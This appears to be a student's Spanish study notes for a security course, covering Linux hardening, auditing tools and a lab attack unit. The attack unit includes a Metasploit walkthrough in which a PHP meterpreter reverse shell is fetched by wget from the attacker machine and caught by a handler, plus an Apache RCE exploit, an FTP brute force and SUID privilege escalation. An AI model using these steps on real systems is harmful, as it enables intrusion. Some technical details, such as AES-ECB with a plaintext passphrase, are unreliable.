@@ -1,0 +1,731 @@
+Todo lo que termine en 0 es una red. 192.168.62.0/24
+
+Tarjeta de red NAT permite conectarnos a internet desde la MV. Es el único acceso que hay al host desde la MV.
+
+El modo bridge nos permitiría conectarnos entre nosotros.
+
+quien soy?: ssiuser
+	$ indica que soy usuario normal
+	% indica que soy root
+en que servidor estoy?: después de los dos puntos.
+	~ imdica que estamos en el directorio home del usuario
+
+----------------------------------------------------------------------------
+ORDENES:
+
+pwd: para ver la ruta del directorio en el que estoy.
+
+ifconfig: para ver las ips de las tarjetas de red.
+	Nos da una lista de todas las interfaces de red configuradas en nuestro sistema.
+	
+	Interfaz bridge (enp0s8)
+
+sudo apt update:
+	…
+	apt es el instalador de paquetes de Ubuntu (le estamos actualizando los paquetes de repositorio).
+	update…
+
+TODOS LOS PROGRAMAS EJECUTABLES ESTARÁN EN EL DIRECTORIO /bin/
+
+
+/bin/etc/apt/sources.list es el fichero con los enlaces a los que sudo apt update accede para actualizar los paquetes de repositorios.
+	…
+
+	/ssh/sshd.conf: es el archivo de configuración del servicio ssh (podemos cambiar el puerto que usa modificando el parámetro correspondiente en este archivo).
+
+/var/log/apache: los log de apache
+/var/log/ssh: los log de ssh
+
+/dev/: tantos ficheros como dispositivos tenga conectados
+	sda1: disco duro que tengo conectado al primer slot de la placa base.
+		sda1s1: primera partición del disco duro anterior (en el caso de que tenga una partición el disco indicado).
+
+
+sudo service ssh status: nos permite verificar si tenemos un servicio instalado a través del parámetro status.
+
+	sudo service ssh start: nos permite iniciar el servicio.
+
+useradd o adduser: para añadir un usuario.
+	sudo adduser nombreUsuario
+
+
+Lo mejor para hacer un cambio de usuario es hacer logout.
+Si necesitamos usarlo temporalmente hacemos uso de la orden "su usuarioCreado".
+	Salimos del usuario con exit y nos devuelve al usuario anterior.
+
+	su - usuario: nos envia al home del usuario y no heredamos las variables de entorno del usuario anterior (IMPORTANTE SABERLO)
+
+ls -al: lista (-l) todo (-a)(incluyendo ficheros y directorios ocultos (los que empiezan con "."))
+
+Permisos:
+	owner. (RWX) (111 == 7)
+	grupo de usuarios del owner.
+	resto.
+
+chmod 777 directorio: cambia permisos del directorio.
+
+sudo usermod nombreusuario -aG sudo: modifica el nombreusuario para que pertenezca a al grupo de usuarios sudo (el segundo sudo)
+
+
+
+UFW es el firewall que usaremos: escribe un fichero en /bin/etc/uptables
+	Comprobamos su estado con sudo ufw status.
+	Añadimos reglas para ssh con sudo ufw allow ssh.
+	Habilitamos con sudo ufw enable.
+	
+
+Lynis: sistema de auditoría que usaremos en la asignatura.
+	instalamos con sudo apt install lynis.
+	instalamos el paquete kbtin (por el ansi2html) con sudo apt install kbtin
+	creamos un sistema de auditoria con sudo lynis audit system (la salida que usa es la por defecto, la pantalla => toda la info que saque lynis nos lo mostrará por pantalla).
+		Para redirigir la salida estándar (stdout) con > nombrearchivo.txt (o el formato que queramos). PERO TODOS LOS POSIBLES WARNINGS O ERRORES SALE POR LA SALIDA ESTANDAR stderr.
+
+			Redirigir salida estándar con >
+			Redirigir salida estándar de error con 2>
+
+Con > se aplasta el contenido del archivo.
+Con >> se hace append al contenido del archivo.
+
+
+sudo lynix audit system > lynis_$(todoLoQueEsteAquiLoVaAInterpretarComoComando).txt
+	sudo lynix audit system > lynis_$(date).txt // va a concatenar el nombre del archivo con la fecha
+
+
+sudo lynix audit system > /dev/null: manda los errores al cajon de la mierda.
+
+
+
+cat nombrefichero: muestra por pantalla el contenido del fichero.
+
+cat lynis.txt.
+	Índice de hardening: nos indica cuánto de segura es la máquina (puntuación del nivel de su seguridad).
+
+
+Para generar un informe HTML
+	• Instala el paquete kbtin, que incluye la herramienta ansi2html.
+	• Ejecuta lynis como en la evaluación del sistema anterior, pero haz un pipe del resultado (|) a la herramienta ansi2html.
+Redirige la salida a un fichero HTML que crees (Ej.: report.html) y verifica el resultado con cualquier navegador.
+
+
+instalamos el paquete kbtin con sudo apt install kbtin.
+ejecutamos la orden, la transformamos a html con un pipe (|) y lo redirigimos a un archivo.
+
+	La orden resultante quedaría: sudo lynis audit system | ansi2html > lynis_formatoHTML.txt
+
+
+orden para analizar malware/rootkits: sudo chkrootkit
+orden para analizar malware/rootkits: sudo rkhunter
+
+-- HERAMIENTA ANTIMALWARE
+Para ejecutar la herramienta antimalware **ClamAV** en Linux, sigue estos pasos:
+
+### 1. **Instalar ClamAV**  
+### 2. **Actualizar la base de datos de virus**  
+Antes de escanear, es recomendable actualizar la base de datos de firmas con:
+
+```bash
+sudo freshclam
+```
+Si ves un error indicando que ClamAV está en uso, detén el servicio antes de actualizar:
+```bash
+sudo systemctl stop clamav-freshclam
+sudo freshclam
+sudo systemctl start clamav-freshclam
+```
+
+### 3. **Ejecutar un escaneo**  
+Para escanear archivos o directorios específicos, usa:
+
+- **Escaneo de un directorio completo** (por ejemplo, `/home/usuario`):
+  ```bash
+  clamscan -r /home/usuario
+  ```
+- **Escaneo con eliminación automática de archivos infectados**:
+  ```bash
+  clamscan -r --remove /home/usuario
+  ```
+- **Escaneo detallado con informe en un archivo de texto**:
+  ```bash
+  clamscan -r -i /home/usuario | tee resultado_escaneo.txt
+  ```
+
+### 4. **Usar el demonio `clamd` para mejor rendimiento**  
+ClamAV tiene un demonio (`clamd`) que permite escaneos más rápidos. Para usarlo:
+
+- Habilita y ejecuta el servicio:
+  ```bash
+  sudo systemctl enable --now clamav-daemon
+  ```
+- Luego, usa `clamdscan` en lugar de `clamscan` para un mejor rendimiento:
+  ```bash
+  clamdscan /home/usuario
+  ```
+
+### 5. **Configurar escaneos automáticos** (opcional)  
+Puedes programar un escaneo automático con `cron` añadiedo esta línea con `crontab -e`:
+
+```bash
+0 2 * * * clamscan -r /home/usuario --remove >> /var/log/clamav/scan.log 2>&1
+```
+Esto ejecutará ClamAV cada día a las 2 AM.
+
+¡Listo! Ahora ClamAV protegerá tu sistema contra malware. 🚀
+
+
+--------------------------------------------------------------------
+
+nmap: es una herramienta que nos permite descubrir todos los dispositivos conectados a una red.
+	Normalmente lo usamos con la ip de la tarjeta bridge (enp0s8).
+		Ejemplo nmap 10.38.0.0 (hay que escribir la primera dir ip de la red fijándonos en la máscara).
+
+	Luego, usa la opción -PS documentada para escanear puertos comunes (22, 80...) en las máquinas localizadas. 
+	Si nmap no localiza máquinas, añade la opción -Pn a tus escaneo para evitar que el firewall los limite.
+		Ejemplo sudo nmap -PS22,80 10.0.2.15 (siendo esta ip la de mi tarjeta de red (enp0s3)) [ESTO ESCANEA LAS MAQUINAS DETECTADAS EN UNA RED A TRAVES DE LOS PUERTOS 22 Y 80 (LA OPCION DE LOS PUERTOS LA ESPECIFICAMOS CON -PSpuerto1[,puerto2[,...]]
+
+
+Tarjeta de red tipo Bridge es la enp0s8.
+Tarjeta de red "normal" (la de mi pc con el que virtualizo la máquina) es la enp0s3 (la que accedemos a la red (wifi)).
+
+RECUERDA: url/robots.txt
+	Disallow: * (indica disallow todo)
+	Disallow: / (indica disallow todo también)
+	
+	crawl-delay: el delay que le metemos entre búsquedas a un robot. (para que no spamee)
+
+	
+exiftool: te da información local de un fichero (con los permisos, el software con el que se ha creado, la hora de creación, el autor y tal). NOS DEJA VER LOS METADATOS.
+
+	Lo instalamos con la orden "sudo apt exiftool".
+
+	
+Google hacking: url del motor de búsqueda de Google (Google dorcs) con etiquetas.
+
+have i been pwned: metemos un correo y nos dice los sitios en los que nuestro correo junto con su contraseña fue filtrado.
+----------------------------------------------------------------------------
+
+# PARA CREAR UNA CLAVE PRIVADA A TRAVES DE UN ALGORITMO KDF (nos interesa el valor de KEY=)
+openssl enc -pbkdf2 -aes-128-ecb -k miguelin_2003 -P > csim.priv
+
+# PARA ENCRIPTAR UN ARCHIVO PASANDO COMO PARAMETRO UNA CLAVE PRIVADA GENERADA
+openssl enc -aes-128-ecb -pbkdf2 -K $(cat csim.priv) -in archivoPruebaCifrado.txt -out archivoEncriptado.enc
+
+# PARA DESENCRIPTAR UN ARCHIVO PASANDO COMO PARAMETRO UNA CLAVE PRIVADA GENERADA
+openssl enc -aes-128-ecb -pbkdf2 -d -K $(cat csim.priv) -in archivoEncriptado.enc -out archivoDesencriptado
+
+# PARA CONFIGURAR HTTPS EN UN DOMINIO QUE TENGA
+https://ssl-config.mozilla.org (para garantizar los mejores parámetros de cifrado posibles)
+https://letsencrypt.org/getting-started/
+
+SI NO TENGO UN DOMINIO, PUEDO HABILITAR HTTPS USANDO UN CERTIFICADO AUTOFIRMADO PARA MI SERVIDOR WEB
+
+# PARA SABER CUÁL ES MI IP PÚBLICA: https://www.whatismyip.com/
+
+# PARA SABER CUÁL ES MI IP PRIVADA:
+ipconfig //all
+	Buscas el adaptador de Wifi (Ej: Adaptador de LAN inalambrica Wi-Fi)
+
+----------------------------------------------------------------------------
+
+MODIFICAR MÓDULOS PAM ENTRA EN EXAMEN
+	Son los módulos de autenticacion del sistema (seccion de control de acceso del CIS benchmark)
+	Estos archivos de PAM normalmente estan en el directorio /etc/pam.d
+
+PREGUNTA DE EXAMEN
+/etc/ssh/ssh_config: fichero de configuracion que establece el comportamiento del cliente ssh
+
+/etc/ssh/sshd_config: fichero de configuracion establece el comportamiento del servidor ssh
+
+sudo cp sshd_config sshd_config.factory-defaults // hace una copia de respaldo del fichero de configuración del comportamiento de ssh en el servidor
+
+
+su - root: para volverme root
+sudo su -: para volverme root
+
+
+PREGUNTA DE EXAMEN
+apparmor es un sandbox que construimos exproceso para una aplicación para que se ejecute en un entorno controlado (una carpeta/directorio) de forma segura
+
+----------------------------------------------------------------------------
+
+SABER CONTROLAR EL FIREWALL Y EL BLOQUE 1 DE LA PRACTICA 7 SIEMPRE CAE EN EXAMEN 
+	EL EJERCICIO 4 DEL BLOQUE 2 DE LA PRACTICA 7 ES FACIL QUE LO PREGUNTEN EN EL EXAMEN (Fail2Ban)
+
+NextDNS es un servidor DNS (las diapos no lo situan en ningún tipo de dns)
+
+Los log están en /var
+
+
+Deniega la conexión a cualquier máquina que pertenezca a tu red de pruebas. Para ello, puedes
+usar el CIDR de la red bridge y bloquear temporalmente el host, o trabajar con un compañero en el
+laboratorio.
+	ip addr show (pillamos el CIDR de la bridge)
+	sudo ufw deny from 10.38.13.162/16
+
+PAGINA DE WAZUH A LA QUE ACCEDER TRAS EL COMPOSE: https://127.0.0.1/app/login?
+
+----------------------------------------------------------------------------
+
+Primero ejecutar el prepare.sh
+	Crea los dockers que componen la infraestructura de docker
+		docker build ... ... // crea los dockers
+
+	El dockerfile indica que quiero crear un Docker y le digo las características del Docker que quiero crear
+
+	
+Luego ejecutar el build (contiene el compose up)
+
+# COMANDOS DOCKER
+docker build .. .. -> Crear
+docker-compose up -d -> Lanzar (con modo detach (-d) [lo lanza en segundo plano (background)]
+docker rm name/id -> Borrar
+docker ps -a -> Listar todos los contenedores
+docker stop name/id -> Parar el contenedor
+docker stop $(docker ps -aq) -> Parar todo
+docker rm -f $(docker ps -aq) -> Borra todo de memoria (no hay que hacer otra vez el prepare)
+docker ps -aq -> Saca lista de todos los identificadores
+sudo docker-compose down: termina los procesos docker
+
+
+El stop borra el contenedor pero no la imagen => no hace falta hacer otra vez el prepare, con el compose ya vale
+
+source enter_kali_lab08.sh -> Entra en el docker de la máquina Kali
+	salimos con exit
+
+carpeta volume_data nos permite meter ficheros en ella y poder acceder a esos ficheros desde los contenedores
+
+/etc/hosts (podemos darle un nombre a una ip de la siguiente forma:)
+	192.168.8.69 maquina1
+
+----------------------------------------------------------------------------
+
+# Estados de los puertos.
+	Puerto open: está abierto siempre y hay un servicio 	corriendo.
+	
+	Puerto close: no está abierto el puerto y no hay un 	servicio corriendo
+
+	Puerto filtered: Pueden ser dos cosas:
+		Hay un firewall filtrando los paquetes.
+		O el estado de mi red es tan precario que 		estoy perdiendo paquetes.
+
+TCP funciona con ACK que es lo que permite a nmap funcionar escaneando puertos.
+
+# TCP vs UDP
+En TCP se sobrecarga mas la red y es más fácil que te pillen.
+	Cuando importa el orden de paquetes (streaming de video) se usa TCP, en caso contrario se usa UDP.
+
+En UDP hay menos trasiego de información -> NMAP saca menos información.
+	Mas eficiente (no eficaz, porque se pierde informacion) a la hora de enviar información.
+
+
+# Estados de puertos.
+	open filetered: puerto abierto pero nmap no es capaz de saber si hay un servicio corriendo o si hay un firewall filtrando los paquetes.
+
+	close filtered: puerto cerrado pero nmap no es capaz de saber si hay un firewall filtrando los paquetes
+
+	unfiltered: indica que hay un firewall prácticamente.
+
+# Solución a problema común con Docker.
+Si tenemos problemas con Docker (pa levantarlo) hay que parar el servicio apparmor.
+
+
+Escaneo de puertos de los servidores eii y epi:
+	EPI:
+		sudo nmap -sS -sV -p - epi (funciona)
+		sudo nmap -sS -p - epi (funciona)
+		sudo nmap -sS -sV epi (funciona)
+			???:
+
+			???:
+	
+	EII:
+		sudo nmap -sN -PA eii
+			-sN: No se habilita ningún flag del paquete TCP
+
+			-PA: Emula la respuesta ACK de una (falsa) conexión TCP. La respuesta a esto determinará si el destino existe.
+
+-sC, -sV, -O, --traceroute y -A hay que evitar usarlos si es posible porque lo mas probable es que te pillen (que se filtre)
+
+----------------------------------------------------------------------------
+
+# Pregunta de examen
+Como crear reglas para que se disparen según el comportamiento el cliente de la petición que se realiza (lo del mod_security)
+
+
+en el docker-compose:
+	Podemos ver la dirección ip de cada contenedor/maquina
+
+sudo docker-compose down: termina los procesos docker
+
+Con el proxy configurado:
+	Desde Kali: http://ipDeKali/eii
+		    http://ipDeKali/epi
+	
+	Desde Ubuntu: http://ipContenedorEii
+		      http://ipContenedorEpi
+
+# Reiniciar Apache2: sudo service apache2 restart
+
+# Pasar un parámetro a una URL: http://192.168.10.3/?parametro=valor&parametro2=valor2&...
+
+# Ver el log de ModSecurity: /var/log/apache2/modsec_audit.log
+/var/log/apache2/error.log
+
+# Activar advertencia de ataque de ejecución remota de comandos (RCE) creando una petición que coincida con las reglas CRS que evitan este tipo de ataques, como pasar un parámetro cualquiera con valor /bin/bash.
+	Ejemplo funcional: sudo curl http://192.168.102.3/?exec=/bin/bash (la clave está en el parámetro exec y su valor)
+
+----------------------------------------------------------------------------
+
+dirb te busca las ruas ocultas resultantes de hacer una web con un framework como WordPress (es un ataque de fuerza bruta)
+
+smbclient o SMBMap te permite atacar el protocolo smb (samba) para "robar/ver" o lo que quieras hacer a ficheros de otras máquinas
+
+# EJERCICIO DE EXAMEN
+Hacer una fuerza bruta contra un servidor web, lo del remotessiuser con nmap (el nombre del script lleva brute)
+
+# EJERCICIO DE EXAMEN
+Hacer un remote Shell con PHP, Python, Bash, …
+
+# PREGUNTA DE UN EXAMEN DE HACE 2 AÑOS
+Busca un exploit para una vulnerabilidad.
+	Comando searchploit terminoABuscarleExploit
+
+
+Pagina de GTFOBins para ver cómo escalar privilegios o robar datos
+
+----------------------------------------------------------------------------
+
+sudo apt install dos2unix (esto era para el script de matar todos los contenedores)
+	dos2unix script.sh
+
+source script.sh (practicando para el examen solo funcionaba ejecutandolo normal (sin el source))
+
+# Iniciar la BBDD de MetaXploit:
+	sudo service postgresql start // inicia el servicio de la BBDD de MetaXploit
+	sudo msfdb init // crea las tablas de la BBDD de MetaXploit
+
+# Entrar a la consola de MetaXploit
+	sudo msfconsole -q
+	
+# Nmap de MetaXploit:
+	db_nmap // guarda todos los datos de enumeración en la BBDD de metaexploit
+
+# Paso 1:
+Usar db_nmap
+
+# Paso 2:
+Hacer
+	search palabrasClaveParaEncontrarExploit
+
+	Ejemplo funcional:
+		search apache 2.4.50
+
+# Paso 3:
+Hacer
+	show payloads (podemos restringir la búsqueda a un objetivo Linux con una conexión TCP inversa para evitar firewalls con search payload/Linux -t reverse)	
+
+	set payload nombreCompletoDelPAYLOAD (sin el payload/)
+
+	info nombreCompletoDelEXPLOIT // para ver los parámetros
+	Los parámetros generalmente serán:
+		RHOST // IP de la víctima (remote host)
+		RPORT // Puerto de la víctima (remote port)
+
+# Paso 4:
+Hacer:
+	use <exploit>
+	set payload <payload sin el payload/>
+	set opcionDelExploit (sacado con el info nombreCompletoExploit) 
+	exploit
+
+	Ejemplo funcional (en la practica no funcionó, no te rayes porque en los objetivos del guión ponía que no importaba que funcionase o no):
+		use exploit/multi/http/apache_normalize_path_rce
+		set payload linux/x64/meterpreter_reverse_tcp
+		set RHOSTS 192.168.12.3
+		set LHOST 192.168.12.2
+		exploit
+
+	Ejemplo funcional con un módulo auxiliar de MSF:
+		use auxiliary/scanner/ftp/ftp_login
+		(Hacer ahora info auxiliary/scanner/ftp/ftp_login para tener los parámetros deseados)
+		set RHOSTS 192.168.12.3
+		set USERNAME root
+		set PASS_FILE /wordlist/2020mostcommon.txt
+		exploit
+
+# Paso 5:
+Generar un exploit (se hace fuera de la consola de MetaXploit):
+	msfveom payloadAsociadoAlExploit > target.py // si lo hago con Python
+
+	Ejemplo funcional:
+		msfvenom -p php/meterpreter_reverse_tcp LHOST=IPInterfazEth0MvAtaque LPORT=3000 -f raw > shell.php
+
+# Paso 6:
+Pasarlo a la MV víctima:
+	# En la MV de ataque:
+		python3 -m http.server 8000
+
+	# En la MV víctima:
+		wget http://IPInterfazEth0MvAtaque:8000/shell.php -O /var/www/html/shell.php
+
+# Paso 7:
+Ejecutar el payload en víctima:
+	# Opción 1 (para este caso)
+		php -f /var/www/html/shell.php
+
+	# Opción 2 (para este caso)
+		En el navegador de la MV host:
+			http://IPMvVictima/shell.php
+
+# Paso 8:
+Ejecutar el exploit:
+	Entrar en msfconsole (con sudo msfconsole -q).
+	Poner:
+		use exploit/multi/handler
+		set PAYLOAD php/meterpreter_reverse_tcp
+		set LHOST IPInterfazEth0DeMvAtaque
+		set LPORT 3000
+		exploit -j
+
+Ahora se habrá creado una sesión que podemos listar en msfconsole con:
+	sessions -l
+
+Nos conectamos a una cualquiera con:
+	sessions -i indiceSesion
+
+Y ya tenemos control de la victima, podemos ejecutar cualquier cosa desde msfconsole de la MV de ataque.
+
+Listado de comandos en la sesión: comando help en msfconsole con la sesión abierta
+
+----------------------------------------------------------------------------
+
+cat /etc/passwd: Tiene los usuarios
+cat /etc/shadow: Tiene las contraseñas de los usuarios
+
+----------------------------------------------------------------------------
+
+Generar contraseña segura:
+Usar la herramienta mkpasswd (la ayuda se accede con mkpasswd --help)
+
+
+	Ejemplo funcional:
+		mkpasswd -m sha-512 -s (Usar SHA-512 y pedir la contraseña desde la entrada estándar)
+
+----------------------------------------------------------------------------
+
+Progamas SetUID y SetGID:
+Los programas SetUID y SetGID son ejecutables con estos bits de permisos habilitados. Estos bits permiten
+que un programa se ejecute temporalmente con los privilegios del propietario del archivo para realizar una
+tarea que los requiera. Puedes encontrar todos los ejecutables instalados actualmente con estos bits
+habilitados con find / -perm -u=s -type f 2>/dev/null. chmod +s activa el bit para cualquier ejecutable
+existente. Este tipo de programas se pueden encontrar en:
+	• En los CTF es una forma común de lograr la escalada de privilegios
+
+
+
+Para escanear ficheros o URLs en busca de malware conocido: VirusTotal
+
+Para saber si una web está identificada como maliciosa por Google (Google Safe Browsing): https://transparencyreport.google.com/safe-browsing/search 
+
+
+# BBDD de CVEs:
+	Pones el producto a pelo en el buscador y sirve: https://cve.mitre.org/cve/search_cve_list.html
+
+	Pones el nombre del producto en el buscador y tienes que seleccionarlo en la sección "Products" del buscador: https://www.cvedetails.com/
+
+
+# Para actualizar la MV:
+	sudo apt update
+		Actualiza el gestor de paquetes de ubuntu
+	sudo apt full-upgrade
+
+
+# Comprobar estado de un servicio
+	sudo systemctl status servicio
+	
+	Ejemplo:
+		sudo systemctl status ssh
+
+
+# Tarjetas Bridge (enp3s8)
+	Normalmente, las tarjetas de tipo Bridge dan automáticamente una IP a la máquina en la misma red que tu PC real.
+
+
+# Webmin
+Se puede acceder al panel de Webmin con localhost:10000 poniendo de username el mismo que el del usuario activo en Ubuntu y la misma contraseña del usuario en Ubuntu
+
+
+# SSH
+	PUEDES CONFIGURARLO CON WEBMIN (LAS INSTRUCCIONES ESTAN EN EL INDICE DE CONTENIDOS)
+
+	Fichero de configuracion de comportamiento del servidor ssh:
+		sudo nano /etc/ssh/sshd_config
+			PermitRootLogin yes // permite el login de ssh como root (NO ES SEGURO, HAY QUE ESTABLECERLO EN no)
+
+		/etc/ssh/ssh_config: fichero de configuracion que establece el comportamiento del cliente ssh
+
+		/etc/ssh/sshd_config: fichero de configuracion establece el comportamiento del servidor ssh
+
+		sudo cp sshd_config sshd_config.factory-defaults // hace una copia de respaldo del fichero de configuración del comportamiento de ssh en el servidor
+
+
+# Podemos iniciar sesion con otro usuario en otra terminal poniendo:
+	sudo login <usuario>
+
+
+# Terminología
+	## Servicios peligrosos
+		Nos referimos a los servicios no utilizados que se sabe que tienen problemas de seguridad en el pasado, por lo que podríamos estar expuestos a ellos (o a otros futuros) simplemente ejecutándolos. Los más famosos que cumplen con este criterio son Avahi, Bluetooth y CUPS.
+
+		Otro servicio que normalmente no se utiliza es motd (mensaje del día).
+
+
+# /etc/shadow contiene los hashes de las contraseñas de cada usuario
+# /etc/passwd contiene los usuarios del sistema junto con los grupos a los que pertenece cada uno
+
+
+# Descomprimir zip a un directorio: unzip -d <directorio> <fichero>
+
+# Cambiar de propietario un fichero: sudo chown nuevo_usuario archivo
+
+# Procesos de servicios (usar systemctl vaya)
+	Ver estado:
+		sudo systemctl status <servicio>
+
+	Arrancar:
+		sudo systemctl start <servicio>
+
+	Parar:
+		sudo systemctl stop <servicio>
+
+	Para ver el resto de comandos hacer:
+		sudo systemctl --help
+
+# Puertos:
+	SSH: 22
+	Telnet: 23
+	Ftp: 20 y 21 (practicando sale el 21 solo)
+	www: 80 (es http)
+	https: 443
+
+# Si quieres hacer nmap desde el host a la MV debes utilizar la ip de la MV que sale en la interfaz de red NAT (RECUERDA QUE ES LA enp0s3) con el comando:
+	ip a
+	-O-
+	ifconfig
+
+	Un nmap que te funcionó practicando el examen fue:
+		nmap -sS -sU -Pn 10.0.2.15
+			Si los puertos estan abiertos, pero no hay ningun servicio corriendo detrás => los puertos no se ven
+	NOTA SUPER IMPORTANTE: SI NO FUNCIONA CON enp0s3 HAZLO CON enp0s8 !!!!!!!! (deberia de hacerse con enp0s8 y no deberia funcionar con enp0s3, pero tu prueba)
+
+# Conectarse a servidor ftp desde:
+	## Host windows:
+		En PowerShell o CMD:
+			ftp <Ip Tarjeta Enp0s8 De La Mv>
+
+	## Ubuntu:
+		ftp <ip_o_dominio_del_servidor>
+
+
+	# Comandos de FTP:
+		ls — listar archivos y carpetas.
+
+		cd <directorio> — cambiar directorio.
+
+		get <archivo> — descargar archivo.
+
+		put <archivo> — subir archivo.
+
+		bye o quit — salir de la sesión FTP.
+
+
+# Cómo funcionan las reglas del firewall
+	El firewall recorre la lista de reglas de arriba a abajo y aplica a primera que encuentre respecto a un servicio deseado
+		Si tenemos una regla que permite el trafico entrante por un puerto X y justo debajo la misma regla pero con deny, se va a aplicar solo la que permite el trafico por estar encima de la regla deny.
+
+		# CONCLUSION: SE APLICA LA PRIMERA REGLA
+
+# ZeroTier
+	Es una VPN P2P
+
+
+# BBDD de CVEs:
+	Pones el producto a pelo en el buscador y sirve: https://cve.mitre.org/cve/search_cve_list.html
+
+	Pones el nombre del producto en el buscador y tienes que seleccionarlo en la sección "Products" del buscador: https://www.cvedetails.com/
+
+# SCA: Un SCA (Software Composition Analysis) [Software de ejemplo: OWASP Dependency Check]:
+	Analiza los componentes de terceros (librerias, frameworks, ...)
+	Identifica vulnerabilidades conocidad (CVEs) en dependencias externas.
+	Evalúa licencias de software (cumplimiento legal)
+
+	## Ventaja: Previene riesgos por usar versiones inseguras de software de terceros
+
+# Para prevenir ataques remotos de fuerza bruta puedes usar un WAF, un Fail2Ban, etc
+	## Para detener por completo el ataque de fuerza bruta de contraseñas contra SSH puedes usar Fail2Ban
+
+# Para ejecutar órdenes Bash en un programa Python:
+	import os
+	os.system("ls -la")
+
+# Para buscar un fichero con find:
+	find /ruta/donde/buscar -name "nombre_del_fichero"
+
+# NOTA: la salida de los procesos administrados por cron se puede ver en /var/log/cron.log
+
+
+# Para que los programas SUID funcionen como GTFOBins se necesita:
+		1. Que el ejecutable tenga el bit SUID activado
+			chmod +s <ejecutable>
+
+			Este bit permite que el prgrama se ejecute CON LOS PERMISOS DEL PROPIETARIO DEL ARCHIVO, no del usuario que lo ejecuta.
+
+		2. El propietario del ejecutable debe ser root
+
+		3. No debe tener restricciones del sistema como noexec o AppArmor/SELinux.
+			Algunas protecciones como:
+
+    				mount -o noexec
+
+				AppArmor o SELinux
+
+				PAM
+
+			pueden impedir que el binario escale, incluso con SUID.
+
+
+## Una forma de conseguir un shell root:
+	sudo /bin/bash (ES MUY IMPORTANTE EL SUDO)
+
+
+## RECUERDA:
+	### Explotar una máquina vs realizar una escalada de privilegios en ella:
+		#### Explotar una maquina:
+			Objetivo: obtener acceso inicial a un sistema
+			
+			Ejemplos:
+				# Usar una vulnerabilidad en un servidor web (como SQL Injection o RCE) para obtener acceso.
+				# Enviar una carga útil maliciosa a un servicio vulnerable (como SMB, FTP, etc.).
+
+				# Aprovechar errores de configuración o contraseñas por defecto.
+
+
+		#### Realizar una escalada de privilegios en ella:
+			Objetivo: Obtener permisos de nivel superior dentro del sistema al que ya se tiene acceso
+
+			Ejemplos:
+				# Explotar una mala configuración de permisos en scripts o archivos.
+
+				# Abusar de servicios mal configurados o cron jobs inseguros.
+				
+				# Explotar vulnerabilidades locales en el sistema operativo.
+
+
+	### Shell no restringido vs Shell root:
+		### Shell no restringido:
+			Definicion: Es un entorno de línea de comandos sin limitaciones impuestas artificialmente, lo que significa que puedes ejecutar cualquier comando que el sistema permita para ese usuario.
+
+		
+		### Shell root:
+			Definicion: Es un shell en el que estás operando como usuario root (o administrador en sistemas Windows), lo cual te da acceso total al sistema.
+
+
